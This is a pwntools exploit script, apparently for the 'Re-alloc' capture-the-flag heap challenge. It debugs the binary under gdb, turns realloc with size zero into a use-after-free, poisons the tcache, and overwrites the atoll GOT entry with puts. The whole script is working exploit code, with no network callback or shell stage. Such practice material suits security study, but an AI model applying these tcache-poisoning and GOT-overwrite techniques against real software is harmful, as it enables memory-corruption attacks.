from pwn import *


realloc = ELF('re-alloc')
libc = ELF('libc.so')


class Prompts:
    CHOICE = 'Your choice: '
    INDEX = 'Index:'
    SIZE = 'Size:'
    DATA = 'Data:'


class Choices:
    ALLOC = '1'
    REALLOC = '2'
    FREE = '3'


p = gdb.debug(
    realloc.path,
    '''
    b *allocate+0xb5
    b *reallocate+0xc2
    b *rfree+0x55
    define hook-stop
    x/2gx &heap
    end
    c
    ''',
    env=dict(LD_PRELOAD=libc.path)
)

DEFAULT_SIZE = 0x18


def alloc_chunk(index, size=DEFAULT_SIZE, data=None):
    print(f'[*] allocating a chunk', f'index: {index}')
    p.sendlineafter(Prompts.CHOICE, Choices.ALLOC)
    p.sendlineafter(Prompts.INDEX, str(index))
    p.sendlineafter(Prompts.SIZE, str(size))
    p.sendlineafter(Prompts.DATA, data if data else 'A' * size)


def free_chunk(index):
    print(f'[*] freeing a chunk', f'index: {index}')
    p.sendlineafter(Prompts.CHOICE, Choices.FREE)
    p.sendlineafter(Prompts.INDEX, str(index))


def realloc_chunk(index, size=DEFAULT_SIZE, data=None):
    print('[*] reallocating a chunk',
          f'index: {index}', f'size: {size}', f'data: {data}')
    p.sendlineafter(Prompts.CHOICE, Choices.REALLOC)
    p.sendlineafter(Prompts.INDEX, str(index))
    p.sendlineafter(Prompts.SIZE, str(size))
    if size:
        p.sendlineafter(Prompts.DATA, data if data else 'B' * size)


def exploit():
    alloc_chunk(0)
    realloc_chunk(0, 0)
    realloc_chunk(0, data=p64(realloc.got['atoll']))
    alloc_chunk(1)
    realloc_chunk(1, DEFAULT_SIZE * 2)
    # The reallocing is needed so that freeing the chunk doesn't go into the bin of the forged chunk.
    free_chunk(1)
    alloc_chunk(1, data=p64(realloc.sym['puts']))


if __name__ == "__main__":
    exploit()
